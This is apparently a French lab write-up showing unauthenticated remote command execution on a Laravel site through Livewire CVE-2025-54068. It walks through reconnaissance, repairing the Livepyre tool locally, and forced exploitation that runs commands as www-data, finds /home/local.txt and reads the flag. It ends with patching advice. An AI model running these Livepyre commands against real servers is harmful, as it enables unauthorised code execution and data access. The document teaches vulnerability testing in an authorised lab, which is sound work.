---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Northstar : RCE non authentifiée via Livewire (CVE-2025-54068)"
date: 2026-10-21
categories: [Pentest, Exploitation]
tags: [cve-2025-54068, livewire, laravel, rce, pre-auth, livepyre, secdojo, ctf]
---

# Lab Northstar : exécution de commande distante via Livewire (CVE-2025-54068)

> **Cible déclarée :** `176.16.163.229`
> **Port web :** `443/tcp` (HTTP en clair, pas HTTPS)
> **Contexte :** lab autorisé
> **Résultat :** ✅ exécution de commande distante confirmée en tant que `www-data`, flag récupéré dans `/home/local.txt`

> ⚠️ **Note de confidentialité :** les jetons CSRF, valeurs de snapshot, checksums, cookies et identifiants visibles dans les captures ne sont pas reproduits ici.


## 1. Résumé du résultat

L'analyse a commencé par un scan Nmap qui a révélé SSH sur le port 22 et un service web identifié comme HTTP sur le port 443. Une première tentative en HTTPS avec WhatWeb a échoué avec `wrong version number`, cohérent avec l'utilisation de HTTP en clair sur un port conventionnellement associé à TLS. Le passage à `http://176.16.163.229:443/` a permis d'obtenir le HTML de Northstar et de constater la présence de Livewire, d'un composant monté nommé `operations-portal` et de l'endpoint `/livewire/update`.

Le contrôle de version de Livepyre n'a pas tranché entre Livewire **3.6.3** et **3.6.4**. En revanche, l'exécution autorisée de sa preuve minimale a renvoyé l'identité `uid=33(www-data)`, confirmant l'exécution de commande à distance. La recherche du fichier `local.txt` a ensuite identifié `/home/local.txt`. Le fichier, de permissions `rw-r--r--`, a pu être lu par le processus web et contenait le flag :

```text
flag_b1cd97f8_8153_4d2c_ba12_b7f23dfd6503
```

La vulnérabilité Livewire a été corrigée dans la version **3.6.4**. La fiche NVD indique les versions affectées comme Livewire v3 jusqu'à 3.6.3 inclusivement et cite la CVE dans le catalogue CISA des vulnérabilités exploitées. L'avis GitHub des mainteneurs décrit une RCE non authentifiée possible dans certains scénarios et recommande la mise à niveau vers 3.6.4 ou ultérieure.

> 💡 La preuve d'exécution obtenue sur ce lab confirme l'impact concret pour la configuration testée ; le simple fait de trouver Livewire sur une page n'aurait pas suffi à le prouver.

## 2. Démarche et relation entre les étapes

La démarche suit cette chaîne : identifier le service et le protocole, obtenir la page et repérer Livewire, préparer l'outil de validation, vérifier la cible, démontrer l'exécution avec une commande sans modification, puis localiser et lire le fichier de flag. Chaque étape dépend de la précédente : sans le bon protocole, le HTML n'est pas accessible ; sans Livewire et un snapshot de composant, Livepyre ne peut pas sélectionner un point de mise à jour ; sans preuve de RCE, la recherche du flag n'est pas justifiée.

## 3. Étape 1 — Reconnaissance réseau

```bash
nmap -A 176.16.163.229
```

Sortie utile observée :

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
443/tcp open  http    Apache httpd 2.4.66
...
Service Info: Host: 172.17.0.2; OS: Linux
```

**Pourquoi cette étape :** le scan sert à repérer les ports accessibles et à identifier les services susceptibles d'exposer l'application. Ici, le port 443 est ouvert, mais Nmap le classe comme `http`, et non `https`. Le numéro de port conventionnel ne garantit pas que le protocole TLS y soit utilisé.

**Interprétation :** les éléments initiaux orientent vers un service web accessible sur le port 443. Ils ne prouvent ni l'utilisation de Livewire ni la présence de la CVE ; il faut examiner la réponse applicative.

## 4. Étape 2 — Corriger le protocole utilisé

### Tentative initiale

```bash
whatweb https://176.16.163.229
```

```text
ERROR Opening: https://176.16.163.229
SSL_connect returned=1 ... wrong version number
```

**Explication :** le client a tenté une négociation TLS, mais la réponse du service n'était pas une réponse TLS valide. Cela concorde avec l'identification `http` faite par Nmap sur le port 443. Il fallait donc demander une page HTTP, tout en précisant explicitement le port :

```bash
whatweb -a 3 http://176.16.163.229:443/
```

Sortie WhatWeb observée :

```text
http://176.16.163.229:443/ [200 OK] Apache[2.4.66], Cookies[XSRF-TOKEN, laravel_session], Country[SAUDI ARABIA][SA], HTML, HTTPServer[Debian Linux][Apache/2.4.66 (Debian)], HttpOnly[laravel_session], IP[176.16.163.229], Laravel, PHP[8.3.29], Script, Title[Northstar Fulfillment Cloud], X-Powered-By[PHP/8.3.29]
```

> ℹ️ Les valeurs des cookies ne figurent pas dans la sortie partagée ; seuls leurs noms sont reportés. `Country[SAUDI ARABIA][SA]` est une indication de géolocalisation produite par WhatWeb, pas une preuve sur l'emplacement physique de l'instance. Les éléments `Apache[2.4.66]`, `Debian Linux`, `Laravel` et `PHP[8.3.29]` constituent une empreinte technologique utile pour orienter l'analyse. Ils ne prouvent pas à eux seuls que la version de Livewire est vulnérable ; c'est l'inspection du HTML, puis le test du composant, qui apporte ces éléments.

La récupération du HTML a ensuite été effectuée avec :

```bash
curl -sL http://176.16.163.229:443/ | grep -Ei 'livewire|csrf-token|update'
```

Sortie utile, expurgée :

```html
<meta name="csrf-token" content="[MASQUÉ]">
<!-- Livewire Styles -->
<div wire:snapshot="[SNAPSHOT MASQUÉ]" ...>
<script src="/livewire/livewire.js?id=df3a17f2"
        data-csrf="[MASQUÉ]"
        data-update-uri="/livewire/update"
        data-navigate-once="true"></script>
```

Le snapshot révélait notamment un composant `operations-portal` avec des propriétés telles que `workspaceKey`, `search`, `region`, `focus`, `timeRange`, `services`, `merchants`, `alerts` et `activity`. Les valeurs de snapshot, le jeton CSRF et le checksum ont été omis, car ils ne sont pas nécessaires au rapport.

**Pourquoi cette étape :** Livewire met en place un cycle de mises à jour de composants. Le HTML a permis d'identifier son script, son endpoint de mise à jour et un composant monté. Ce sont des indices nécessaires à une vérification ciblée, mais ils ne suffisent pas à conclure qu'un composant satisfait les préconditions d'exploitation de CVE-2025-54068.

## 5. Étape 3 — Préparer Livepyre dans Kali

Le dépôt Livepyre documente les options `-u` pour l'URL, `-c` pour une vérification seulement, `-p` pour le paramètre transmis à la fonction et `--force` pour ignorer le contrôle de version. Le projet utilise PyCryptodome, Requests et leurs dépendances.

### 5.1 Premier problème : dépendance manquante

Le lancement initial échouait avant tout accès à la cible :

```text
ModuleNotFoundError: No module named 'Crypto'
```

Toutes les traces pointaient vers l'import `Crypto.Cipher.AES` dans le code de Livepyre.

### 5.2 Tentative d'installation par pip

```bash
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

```text
Failed to establish a new connection: [Errno 101] Network is unreachable
HTTPSConnection(host='pypi.org', port=443)
```

**Interprétation :** la machine Kali ne pouvait pas joindre PyPI. La dépendance n'a donc pas été installée via pip. Cette erreur concernait l'environnement local et non le serveur Northstar.

### 5.3 Paquet système disponible sous l'espace de noms Cryptodome

```bash
dpkg -s python3-pycryptodome | grep '^Status'
dpkg -L python3-pycryptodome | grep -E '/(Crypto|Cryptodome)/' | head
/usr/bin/python3 -c 'from Cryptodome.Cipher import AES; print("Cryptodome OK")'
```

```text
Status: install ok installed
/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py
Cryptodome OK
```

En revanche, l'import attendu par Livepyre échouait :

```text
ModuleNotFoundError: No module named 'Crypto'
```

Le Python système était `/usr/bin/python3`, version `3.14.7`. Le correctif local a consisté à remplacer les imports `Crypto` concernés par `Cryptodome` dans les fichiers de chiffrement de Livepyre, **dans le clone local du lab, pas sur la cible** :

```bash
sed -i \
  -e 's/from Crypto import Random/from Cryptodome import Random/' \
  ~/Desktop/Livepyre/exploit/laravel_crypto/laravel_encrypter.py

sed -i \
  -e 's/from Crypto\.Cipher import AES/from Cryptodome.Cipher import AES/' \
  ~/Desktop/Livepyre/exploit/laravel_crypto/aes_encrypter.py
```

> 💡 Un import dans `crypto_verb.py` avait aussi été remplacé auparavant. Le motif de recherche `grep -RInE 'from Crypto|import Crypto'` correspond aussi au préfixe du mot `Cryptodome` ; il pouvait donc continuer à afficher des lignes déjà corrigées. Pour détecter les anciens imports avec plus de précision :
>
> ```bash
> grep -RInE 'from Crypto(\.| )|import Crypto(\.| )' \
>   ~/Desktop/Livepyre --include='*.py'
> ```

### 5.4 Mauvais chemin du script et environnement virtuel absent

Deux erreurs de chemin ont été rencontrées : le script a d'abord été lancé depuis `~/Desktop` au lieu de `~/Desktop/Livepyre`, et `.venv/bin/activate` n'existait pas encore. La commande finale a explicitement utilisé `/usr/bin/python3` et le chemin complet du script.

## 6. Étape 4 — Vérifier puis démontrer l'impact

### Vérification non intrusive avec `-c`

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' -c
```

```text
[WARNING] The remote livewire version is either v3.6.3 or v3.6.4.
Target might not be vulnerable.
```

Le contrôle de version n'a donc pas établi de façon certaine de quel côté du correctif se trouvait la cible.

### Preuve minimale avec `--force`

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force
```

```text
[ERROR] Running exploit even if target does not seem to be vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit without APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Found 9 possible param(s).
[INFO] services is typed as an object, triggering RCE.
[INFO] Sending payload system('id') to livewire.
[INFO] Payload works, output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Rôle de cette étape :** `--force` neutralise la précaution fondée sur le fingerprint de version ; il ne s'agit pas d'une simple vérification. La réponse `uid=33(www-data)` démontre que la commande s'est exécutée avec les privilèges du compte de service web.

> ⚠️ Ce n'est **pas** une élévation de privilèges root : le résultat montre `www-data`.

## 7. Étape 5 — Localiser le fichier de flag

### 7.1 Première tentative : chemin courant

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force -p 'cat /flag'
```

La sortie était vide — cela ne prouvait pas à elle seule si le fichier était absent ou si son erreur était renvoyée sur stderr.

### 7.2 Recherche de noms contenant `flag`

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force \
  -p 'find / -maxdepth 6 -type f -iname "*flag*" -print 2>/dev/null'
```

Sortie représentative :

```text
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/virtual/net/eth0/flags
...
/usr/include/linux/tty_flags.h
```

> 💡 Cette recherche a trouvé des fichiers système dont le nom contient la chaîne `flag`, mais pas le fichier d'exercice qui s'appelait `local.txt` — ce résultat montre pourquoi une recherche par motif peut manquer un flag lorsque le nom du fichier n'inclut pas le mot `flag`.

### 7.3 Lister les emplacements usuels

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force \
  -p 'pwd; ls -la /; ls -la /var/www /var/www/html /home /opt /tmp 2>/dev/null'
```

```text
/var/www/html/public
...
/home:
-rw-r--r-- 1 55555 55555 42 Oct 21 10:43 local.txt
...
/var/www/html:
-rw-rw-r-- 1 root root 288 Mar 26 2026 .env
```

Le listing a révélé `/home/local.txt`, de taille 42 octets et de permissions `rw-r--r--`. Cela explique pourquoi le processus `www-data` pouvait lire le fichier sans en être le propriétaire. Un fichier `.env` était également présent dans l'arborescence applicative ; son contenu n'a pas été lu, car cela n'était pas nécessaire à l'objectif du lab.

### 7.4 Confirmer le chemin

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force \
  -p 'find / -type f -name local.txt -print 2>/dev/null'
```

```text
/home/local.txt
/home/local.txt
```

### 7.5 Lecture du vrai chemin

```bash
/usr/bin/python3 ~/Desktop/Livepyre/Livepyre.py \
  -u 'http://176.16.163.229:443/' --force \
  -p 'cat /home/local.txt'
```

```text
[INFO] Sending payload system('cat /home/local.txt') to livewire.
[INFO] Payload works, output:
flag_b1cd97f8_8153_4d2c_ba12_b7f23dfd6503
```

## 8. Conclusions et portée

Le test a confirmé qu'une requête non authentifiée pouvait exploiter le flux de mise à jour/hydratation du composant Livewire exposé pour exécuter une commande sous le compte `www-data`, puis lire `/home/local.txt`. Le flag a donc été récupéré sans accès root. L'indication de version Livewire restait ambiguë entre 3.6.3 et 3.6.4, mais le succès du payload prouve l'exploitabilité du scénario testé ; il ne faut pas généraliser cette observation à tous les déploiements Livewire.

Pour un système réel, la mesure principale est de mettre Livewire à jour vers **3.6.4 ou une version ultérieure**, puis de vérifier que les dépendances réellement déployées sont corrigées. L'avis GitHub indique qu'aucun contournement n'est connu. Il faut également retirer toute donnée sensible exposée par erreur, éviter d'inclure les jetons de session/CSRF dans les rapports et vérifier les journaux HTTP/Laravel ainsi que l'intégrité de l'environnement.

## Leçons retenues

- Un port conventionnellement associé à TLS (443) ne garantit pas que le service y écoutant parle réellement TLS — toujours vérifier le protocole réel avant de s'acharner sur une négociation TLS qui échoue systématiquement.
- Un contrôle de version ambigu (`-c` n'a pas tranché entre 3.6.3 et 3.6.4) ne doit pas bloquer la démonstration d'impact quand le contexte de lab l'autorise explicitement — le succès du payload reste la preuve la plus solide, indépendamment du fingerprint de version.
- Un problème d'environnement local (dépendance Python absente, mauvais nom de module `Crypto` vs `Cryptodome`) ne doit jamais être confondu avec un problème côté cible — toujours isoler clairement les erreurs d'outillage des erreurs d'exploitation.
- Une recherche de fichier par motif (`*flag*`) peut manquer la cible réelle si son nom ne contient pas ce mot — compléter systématiquement par un listing des répertoires usuels (`/home`, `/var/www`, `/opt`, `/tmp`).

## Références

1. [NVD — CVE-2025-54068](https://nvd.nist.gov/vuln/detail/CVE-2025-54068)
2. [Livewire security advisory — GHSA-29cq-5w36-x7w3](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)
3. [Synacktiv — dépôt Livepyre](https://github.com/synacktiv/Livepyre)
4. [Livepyre — requirements.txt](https://github.com/synacktiv/Livepyre/blob/main/requirements.txt)
